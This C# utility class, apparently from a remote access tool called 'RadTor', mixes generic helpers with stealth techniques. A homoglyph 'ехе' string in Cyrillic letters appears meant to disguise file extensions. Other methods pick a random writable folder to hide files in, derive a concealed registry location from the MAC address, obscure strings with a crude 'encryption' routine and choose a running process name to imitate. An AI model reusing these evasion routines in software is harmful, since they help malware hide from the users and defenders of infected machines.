using System;
using Shell32;
using System.Drawing;
using System.IO;

using System.Text;
using LocalRT.radtor.utils;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Linq;

namespace LocalRT.radtor.utils
{
    class RadTorUtil
    {

        public static string fakeExe = "ехе";

        static string[] sizeSuffixes = {
        "B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
        private static string CURRENT_USER = "HKEY_CURRENT_USER\\";

        public static string randomAlpha(int Max)
        {
            String randomString = "";
            Random r = new Random();
            for (int i = 1; i <= Max; i++)
            {
                int x = r.Next(10);
                if (x > 5)
                {
                    randomString = randomString + ((char)(66 + r.Next(25)));
                }
                else
                {
                    randomString = randomString + ((char)(66 + r.Next(25))).ToString().ToLower();
                }
            }
            return randomString;
        }

        public static int randomNumber(int min, int max)
        {
            Random r = new Random();
            return r.Next(min, max);
        }

        public static string returnRandomSubFolder(string path)
        {
            String theBestPath = LocalConfiguration.translateSystemVar(path);
            DirectoryInfo dirinfo = new DirectoryInfo(theBestPath);
            Random r = new Random();
            DirectoryInfo randomPath = (DirectoryInfo)dirinfo.GetDirectories().GetValue(r.Next(dirinfo.GetDirectories().Length));
            while (LocalConfiguration.HasAccess(randomPath.FullName, LocalConfiguration.CurrentUser))
            {
                theBestPath = randomPath.FullName;
                if (randomPath.GetDirectories().Length > 0)
                {
                    return returnRandomSubFolder(theBestPath);
                }
                else
                {
                    return theBestPath;
                }
            }
            return theBestPath;
        }

        public static string ImageToBase64String(Image image)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                image.Save(stream, image.RawFormat);
                return Convert.ToBase64String(stream.ToArray());
            }
        }

        public static Bitmap resizeImage(Image imgToResize, Size size)
        {
            return new Bitmap(imgToResize, size);
        }


        Image ImageFromBase64String(string base64String)
        {
            using (MemoryStream stream = new MemoryStream(
                Convert.FromBase64String(base64String)))
            using (Image sourceImage = Image.FromStream(stream))
            {
                return new Bitmap(sourceImage);
            }
        }

        public static string getContentType(string filePath)
        {
            string contentType = "application/octetstream";
            string ext = System.IO.Path.GetExtension(filePath).ToLower();
            Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey(ext);
            if (registryKey != null && registryKey.GetValue("Content Type") != null)
                contentType = registryKey.GetValue("Content Type").ToString();
            return contentType;
        }

        public static string getAbsoluteDomain(string address)
        {
            String pingAddress = (address.StartsWith("http") ? address.Substring("http://".Length) : address.Substring("https://".Length));
            return pingAddress.Split('/')[0];
        }

        public static string DecodeUrlString(string url)
        {
            string newUrl;
            while ((newUrl = Uri.UnescapeDataString(url)) != url)
                url = newUrl;
            return newUrl;
        }

        static public string EncodeTo64(string toEncode)
        {
            byte[] toEncodeAsBytes = System.Text.ASCIIEncoding.ASCII.GetBytes(toEncode);
            string returnValue = System.Convert.ToBase64String(toEncodeAsBytes);
            return returnValue;
        }

        static public string Decode64(string encodedString)
        {
            byte[] data = Convert.FromBase64String(encodedString);
            return Encoding.UTF8.GetString(data);
        }


        public static string shitEncript(string text)
        {
            String result = "";
            text = "!" + text;
            for (int i = text.Length - 1; i > -1; i--)
            {
                if (i % 2 != 0)
                {
                    result += text.Substring(i, 1);
                }
            }
            return result;
        }

        public static string ByteSize(long size)
        {
            const string formatTemplate = "{0}{1:0.#} {2}";
            if (size == 0)
            {
                return string.Format(formatTemplate, null, 0, sizeSuffixes[0]);
            }
            var absSize = Math.Abs((double)size);
            var fpPower = Math.Log(absSize, 1000);
            var intPower = (int)fpPower;
            var iUnit = intPower >= sizeSuffixes.Length
                ? sizeSuffixes.Length - 1
                : intPower;
            var normSize = absSize / Math.Pow(1000, iUnit);
            return string.Format(
                formatTemplate,
                size < 0 ? "-" : null, normSize, sizeSuffixes[iUnit]);
        }

        public static String formatDateTime(DateTime dt)
        {
            return String.Format("{0:u}", dt);
        }

        public static void DeCompressFile(string CompressedFileName, string ExpandedFolder)
        {
            if (!winRarOrZipExists())
            {
                RadTorLog.log("DESCOMPRIMIENDO!!! -->" + CompressedFileName);
                RadTorLog.log("DESCOMPRIMIENDO!!! -->" + ExpandedFolder);

                Type t = Type.GetTypeFromProgID("Shell.Application");

                dynamic Sh = Activator.CreateInstance(t);

                Folder SF = Sh.NameSpace(CompressedFileName);
                Folder DF = Sh.NameSpace(ExpandedFolder);
                foreach (FolderItem F in SF.Items())
                {
                    DF.CopyHere(F, 0);
                }
                RadTorLog.log("DESCOMPRIMIENDO!!! FIN :D");
            }
        }

        private static bool winRarOrZipExists()
        {
            return false;
        }

        public static string getLocalRegeditPathByMAC()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\");
            return iterateRegedit(key, LocalConfiguration.getMac(), 12).Replace(CURRENT_USER,"");
        }

        private static string iterateRegedit(RegistryKey key, String mac, int index)
        {
            String finalPath = key.Name;
            String letters = "AEIOUAEIO";
            foreach (var v in key.GetSubKeyNames())
            {
                RegistryKey keys = key.OpenSubKey(v);
                string path = (String)v;
                if (index > 0)
                {
                    char letter = mac[index - 1];
                    if (!path.ToUpper().Contains(String.Format("{0}", letter)))
                    {
                        if (!Regex.IsMatch(String.Format("{0}", letter), @"^[a-zA-Z]+$"))
                        {
                            letter = letters[int.Parse(String.Format("{0}", letter))];
                        }
                    }
                    if (path.ToUpper().Contains(String.Format("{0}", letter)))
                    {
                        RadTorLog.log(String.Format("[REGEDIT]   {0} = {1}, para {2}", key.Name, v, letter));
                        index--;
                        finalPath =  iterateRegedit(keys, mac, index);
                        break;
                    }
                }
                else
                {
                    finalPath = key.Name + @"\" + path;
                    RadTorLog.log("Regedit PATH :" + path);
                    break;
                }
            }
            return finalPath;
        }

        public static string theBestProcess()
        {
            Process[] runningProcesses = Process.GetProcesses();
            var currentSessionID = Process.GetCurrentProcess().SessionId;

            Process[] sameAsThisSession =
                runningProcesses.Where(p => p.SessionId == currentSessionID).ToArray();
            
            TimeSpan time = new TimeSpan();
            String exe = "";
            bool noTime = true;

            foreach (System.Diagnostics.Process process in sameAsThisSession)
            {
                try
                {
                    exe = process.MainModule.FileName;
                    FileInfo exeIcon = new FileInfo(exe);
                    if (Icon.ExtractAssociatedIcon(exeIcon.FullName)==null)
                    {
                        Console.WriteLine("NO Tiene icono");
                    }
                    if (noTime) {
                        time = process.UserProcessorTime;
                        noTime = false;
                    }
                    if (!noTime && time > process.UserProcessorTime)
                    {
                        time = process.UserProcessorTime;

                    }
                }
                catch { noTime = true; }
            }
            FileInfo exeFile = new FileInfo(exe);

            return exeFile.Name;
        }
    }
}
